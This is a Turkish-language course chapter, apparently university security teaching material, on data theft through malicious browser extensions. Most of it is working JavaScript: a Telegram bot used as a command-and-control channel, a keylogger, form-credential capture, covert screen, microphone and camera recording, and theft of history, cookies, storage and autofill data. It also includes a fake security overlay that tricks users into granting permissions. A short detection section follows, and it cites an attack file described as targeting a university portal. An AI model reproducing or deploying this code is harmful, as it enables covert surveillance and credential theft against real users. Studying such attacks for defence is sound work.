
# 02. Veri Sızdırma (Exfiltration) ve Zararlı Fonksiyonlar

## 📋 Konu Özeti

Tarayıcı eklentisine erişim sağlandıktan sonra, asıl hedef değerli verilerin çalınması ve saldırgana iletilmesidir. Bu bölümde, keylogger, ekran kaydı, mikrofon dinleme gibi zararlı fonksiyonların nasıl implemente edildiğini ve Telegram gibi meşru servislerin C2 (Command & Control) merkezi olarak nasıl kullanıldığını inceleyeceğiz.

---

## 📡 2.1. Komuta ve Kontrol (C2) Merkezi: Telegram

### Neden Telegram?

**Avantajlar:**
- ✅ **7/24 Erişilebilir:** Telegram sunucuları sürekli aktif
- ✅ **Şifreli İletişim:** HTTPS ile tüm veriler şifreli
- ✅ **Gizlilik:** Milyonlarca meşru kullanıcının trafiği arasında kaybolma
- ✅ **Kolay Kurulum:** Botfather ile saniyeler içinde bot oluşturma
- ✅ **Anlık Bildirim:** Çalınan veriler anında mesaj olarak gelir
- ✅ **Firewall Bypass:** `api.telegram.org` genellikle engellenmez

### Telegram Bot Kurulum Süreci

**1. Botfather ile Bot Oluşturma**
```
1. Telegram'da @BotFather'a mesaj at
2. /newbot komutunu gönder
3. Bot ismini belirle
4. API Token'ı kaydet: 123456789:ABCdefGHIjklMNOpqrsTUVwxyz
```

**2. Chat ID Öğrenme**
```javascript
// Method 1: Test mesajı gönderip getUpdates
fetch(`https://api.telegram.org/bot${API_TOKEN}/getUpdates`)

// Method 2: @userinfobot kullanımı
// Method 3: Web console'da ID'yi bulma
```

**3. Veri Gönderme API'si**
```javascript
const API_TOKEN = "BOT_TOKEN_BURAYA";
const CHAT_ID = "KULLANICI_CHAT_ID";

function sendToTelegram(data) {
    const message = `🚨 Yeni Veri:\n${data}`;
    const url = `https://api.telegram.org/bot${API_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    });
}
```

---

## ⌨️ 2.2. Keylogger (Klavye Dinleyici)

### İmplementasyon Stratejisi

**Content Script Injection:**
```javascript
// content_script.js - Her web sayfasında çalışır
document.addEventListener('keydown', function(e) {
    // Özel alanları hedefle
    const target = e.target;
    const tagName = target.tagName.toLowerCase();
    const inputType = target.type;
    
    // Kritik input alanlarını tespit et
    if ((tagName === 'input' && 
        (inputType === 'password' || inputType === 'email' || 
         inputType === 'text' || inputType === 'tel')) ||
        tagName === 'textarea') {
        
        // Klavye girişlerini kaydet
        logKeyStroke(e.key, target.name || target.id, window.location.href);
    }
});

function logKeyStroke(key, field, url) {
    // Buffer'a ekle, toplu gönderim için
    keylogBuffer.push({
        key: key,
        field: field,
        url: url,
        timestamp: Date.now()
    });
    
    // Buffer dolduğunda gönder
    if (keylogBuffer.length >= 50) {
        sendBufferToC2();
    }
}
```

### Gelişmiş Keylogger Teknikleri

**Form Submit Yakalama:**
```javascript
document.addEventListener('submit', function(e) {
    const form = e.target;
    const formData = new FormData(form);
    
    let credentials = {};
    for (let [key, value] of formData.entries()) {
        if (key.toLowerCase().includes('pass') || 
            key.toLowerCase().includes('email') ||
            key.toLowerCase().includes('user')) {
            credentials[key] = value;
        }
    }
    
    if (Object.keys(credentials).length > 0) {
        sendToTelegram(`🔐 Form Data: ${JSON.stringify(credentials)}`);
    }
});
```

---

## 👁️ 2.3. Gözetim Fonksiyonları

### Ekran Kaydı (Screen Recording)

```javascript
async function startScreenCapture() {
    try {
        // Kullanıcıdan izin iste (sosyal mühendislik gerekli)
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { mediaSource: 'screen' },
            audio: true
        });
        
        // MediaRecorder ile kaydet
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            uploadToTelegram(blob, 'screen_recording.webm');
        };
        
        mediaRecorder.start();
        
        // 30 saniye kaydet, sonra dur
        setTimeout(() => mediaRecorder.stop(), 30000);
        
    } catch (err) {
        console.error('Screen capture failed:', err);
    }
}
```

### Ekran Görüntüsü (Screenshot)

```javascript
function takeScreenshot() {
    // Aktif sekmeden görüntü al
    chrome.tabs.captureVisibleTab(null, {format: 'png'}, function(dataUrl) {
        if (dataUrl) {
            // Base64 verisini Telegram'a gönder
            sendToTelegram(`📸 Ekran Görüntüsü: ${window.location.href}`);
            uploadImageToTelegram(dataUrl);
        }
    });
}

// Her 5 dakikada bir ekran görüntüsü al
setInterval(takeScreenshot, 5 * 60 * 1000);
```

### Mikrofon Dinleme

```javascript
async function startAudioSurveillance() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            audio: {
                echoCancellation: false,
                noiseSuppression: false,
                sampleRate: 44100
            }
        });
        
        const mediaRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        
        mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
        
        mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
            uploadToTelegram(audioBlob, 'audio_capture.wav');
        };
        
        // 60 saniye kaydet
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 60000);
        
    } catch (error) {
        console.error('Mikrofon erişimi başarısız:', error);
    }
}
```

### Kamera Erişimi

```javascript
async function takeCameraPhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { width: 1280, height: 720 }
        });
        
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        video.onloadedmetadata = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            // Fotoğrafı base64 olarak al
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Stream'i kapat
            stream.getTracks().forEach(track => track.stop());
            
            uploadImageToTelegram(imageData);
        };
        
    } catch (error) {
        console.error('Kamera erişimi başarısız:', error);
    }
}
```

---

## 🌐 2.4. Tarayıcı Verisi Hırsızlığı

### Gezinti Geçmişi Çalma

```javascript
function stealBrowsingHistory() {
    chrome.history.search({
        text: '',
        maxResults: 1000,
        startTime: Date.now() - (30 * 24 * 60 * 60 * 1000) // Son 30 gün
    }, function(historyItems) {
        let historyData = historyItems.map(item => ({
            url: item.url,
            title: item.title,
            visitCount: item.visitCount,
            lastVisit: new Date(item.lastVisitTime)
        }));
        
        // Hassas siteleri filtrele ve öncelikle gönder
        let sensitiveHistory = historyData.filter(item => 
            item.url.includes('bank') || 
            item.url.includes('payment') ||
            item.url.includes('login') ||
            item.url.includes('.gov')
        );
        
        if (sensitiveHistory.length > 0) {
            sendToTelegram(`🏛️ Hassas Site Geçmişi:\n${JSON.stringify(sensitiveHistory, null, 2)}`);
        }
        
        // Tüm geçmişi parçalar halinde gönder
        sendDataInChunks(historyData, 'Gezinti Geçmişi');
    });
}
```

### Çerezler ve Storage Verileri

```javascript
function stealStorageData() {
    // LocalStorage
    let localStorage = {};
    for (let i = 0; i < window.localStorage.length; i++) {
        let key = window.localStorage.key(i);
        localStorage[key] = window.localStorage.getItem(key);
    }
    
    // SessionStorage  
    let sessionStorage = {};
    for (let i = 0; i < window.sessionStorage.length; i++) {
        let key = window.sessionStorage.key(i);
        sessionStorage[key] = window.sessionStorage.getItem(key);
    }
    
    // Çerezleri al
    chrome.cookies.getAll({}, function(cookies) {
        let cookieData = cookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            secure: cookie.secure,
            httpOnly: cookie.httpOnly
        }));
        
        sendToTelegram(`🍪 Storage Verileri:\nLocalStorage: ${Object.keys(localStorage).length} adet\nCookies: ${cookieData.length} adet`);
    });
}
```

### Otomatik Form Verileri

```javascript
function stealAutoFillData() {
    // Chrome autofill verilerini çalmak daha karmaşık
    // Bunun yerine form field'larını dinleyerek
    // auto-complete verilerini yakalayabiliriz
    
    document.addEventListener('input', function(e) {
        const target = e.target;
        if (target.value && target.value.length > 3) {
            // Otomatik doldurulmuş veriler (muhtemelen)
            if (e.inputType === 'insertReplacementText') {
                sendToTelegram(`💳 Auto-fill Veri: ${target.name}: ${target.value}`);
            }
        }
    });
}
```

---

## 📱 2.5. Sosyal Mühendislik ve İzin Alma

### Sahte Bildirimler

```javascript
function createFakeNotification() {
    // Sahte güvenlik uyarısı
    const fakeAlert = document.createElement('div');
    fakeAlert.innerHTML = `
        <div style="position:fixed; top:0; left:0; width:100%; height:100%; 
                    background:rgba(0,0,0,0.8); z-index:999999;">
            <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);
                        background:white; padding:20px; border-radius:10px; text-align:center;">
                <h2>🔒 Güvenlik Doğrulaması Gerekli</h2>
                <p>Hesabınızın güvenliği için ses kaydı yapılacaktır.</p>
                <button onclick="requestMicrophoneAccess()">Devam Et</button>
            </div>
        </div>
    `;
    document.body.appendChild(fakeAlert);
}

function requestMicrophoneAccess() {
    // Kullanıcı "Devam Et" dediğinde gerçek izin iste
    navigator.mediaDevices.getUserMedia({audio: true})
        .then(stream => {
            console.log('Mikrofon izni alındı!');
            startAudioSurveillance();
        });
}
```

---

## 📤 2.6. Veri Upload ve Exfiltration

### Dosya Upload Fonksiyonu

```javascript
async function uploadToTelegram(blob, filename) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', blob, filename);
    
    try {
        await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendDocument`, {
            method: 'POST',
            body: formData
        });
    } catch (error) {
        console.error('Upload failed:', error);
    }
}

function sendDataInChunks(data, dataType) {
    const jsonString = JSON.stringify(data, null, 2);
    const chunkSize = 4000; // Telegram mesaj limiti ~4096
    
    for (let i = 0; i < jsonString.length; i += chunkSize) {
        const chunk = jsonString.slice(i, i + chunkSize);
        const partNumber = Math.floor(i / chunkSize) + 1;
        const totalParts = Math.ceil(jsonString.length / chunkSize);
        
        sendToTelegram(`📊 ${dataType} (${partNumber}/${totalParts}):\n\`\`\`\n${chunk}\n\`\`\``);
        
        // Rate limiting için delay
        setTimeout(() => {}, 1000);
    }
}
```

---

## 🛡️ 2.7. Tespit ve Savunma

### Anormal Davranış İşaretleri

**Kullanıcı Gözlem Noktaları:**
- 🔴 Beklenmeyen mikrofon/kamera izin istekleri
- 🔴 Tarayıcıda performans düşüklüğü
- 🔴 Anormal ağ trafiği artışı
- 🔴 Battery drain (mobil cihazlar)

**Network Monitoring:**
```bash
# Şüpheli Telegram API trafiği
netstat -an | grep api.telegram.org
tcpdump -i any host api.telegram.org

# DNS sorguları izleme
dig api.telegram.org
nslookup api.telegram.org
```

### Savunma Mekanizmaları

**Browser Seviyesinde:**
- Permission management sıkılaştırma
- Content Security Policy (CSP) uygulaması
- Extension activity monitoring

**Network Seviyesinde:**
- Outbound traffic analysis
- DLP (Data Loss Prevention) solutions
- Bot traffic detection

---

## 📊 Özet

Veri sızdırma aşaması, eklenti tabanlı saldırının en kritik bölümüdür. Saldırganlar, keylogger, ekran kaydı, mikrofon dinleme gibi çoklu vektörler kullanarak maksimum veri toplamaya odaklanırlar. Telegram gibi meşru servisler C2 merkezi olarak kullanılarak, tespit edilmesi zorlaştırılır.

**Temel Çıkarımlar:**
- Modern browser API'leri güçlü gözetim imkanları sunar
- Sosyal mühendislik ile kullanıcı izni elde edilebilir
- Meşru servisler C2 merkezi olarak kötüye kullanılabilir
- Çok katmanlı monitoring gereklidir

---

## 💻 2.8. Gerçek Saldırı Kodu Örneği

Aşağıda, yukarıda açıklanan tüm tekniklerin bir araya getirildiği gerçek bir saldırı kodu örneği bulunmaktadır:

> 📄 [content.js](assets/02.content.js)

### Kod Analizi

Bu gerçek saldırı kodu aşağıdaki işlevleri yerine getirir:

**🎯 Ana Özellikler:**
- **Site Takibi:** Açılan her web sitesinin URL'sini Telegram'a gönderir
- **Keylogger:** Klavye girişlerini toplar ve kritik anlarda gönderir
- **Görsel Hırsızlığı:** Sayfadaki tüm görselleri (base64 dahil) çalar
- **Mikrofon Kayıt:** 10 saniyelik ses kayıtları yapıp gönderir
- **Kamera Kayıt:** Video kayıtları alır ve upload eder
- **İzin Kontrolü:** Mikrofon ve kamera izinlerini sürekli kontrol eder

**🔴 Tehlike Seviyeleri:**
- Instagram, Teams, WhatsApp gibi popüler sitelerde özel işlemler için hazır
- Üniversite OIS sistemini (ois.istinye.edu.tr) özellikle hedefliyor
- GitHub aktivitelerini izliyor
- Sürekli çalışan arka plan fonksiyonları

**🛡️ Tespit Noktaları:**
- Console.log çıktıları geliştirici araçlarında görünür
- Sürekli network istekleri api.telegram.org'a
- Yüksek CPU kullanımı (sürekli DOM izleme)
- Mikrofon/kamera LED ışığı aktivasyonu

---

**Önceki Konu:** [01. Tarayıcı Eklentileri](01.tarayici-eklentileri.md) | **Sonraki Konu:** [03. Dinamik Payload Yükleme](03.dinamik-payload.md)

---


| **By**                                                                                   | **Keyvan Arasteh**                       |
| --------------------------------------------------------------------------------------------------- | --------------------------------- |
| [![LinkedIn](https://img.shields.io/badge/LinkedIn-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/keyvanarasteh)   | Istinye Universitesi               |
| [![GitHub](https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/keyvanarasteh)             | Bilisim Guvenligi Teknolojisi     |
| [![YouTube](https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/@drvoidgate)        | drvoid gate Channel               |

